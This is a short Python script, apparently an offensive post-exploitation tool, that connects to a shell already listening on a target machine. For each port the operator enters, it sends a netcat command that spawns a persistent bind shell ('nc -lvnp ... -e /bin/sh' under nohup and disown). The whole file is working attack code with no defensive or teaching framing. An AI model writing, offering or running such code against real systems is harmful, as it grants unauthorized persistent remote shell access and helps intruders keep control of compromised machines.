import sys
import socket

def create_shells(target_ip, target_port, nports):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))	
	for nport in nports:
		s.sendall(("nohup nc -lvnp {} -e /bin/sh & disown\n").format(nport).encode())
	s.close()


def main():
	print("enter the ipv4 and port the target is currently listening on...")
	host = input("ipv4: ")
	port = input("port: ")
	if not port.isdigit():
		print("invalid port")
		exit(1)
	port = int(port)

	print("enter the new port(s) for the target to listen on (one per line)...")
	nports = set()
	nport = None
	while nport != "":
		nport = input("")
		if nport.isdigit():
			nports.add(nport)
	
	create_shells(host, port, nports)


if __name__ == '__main__':
	main()
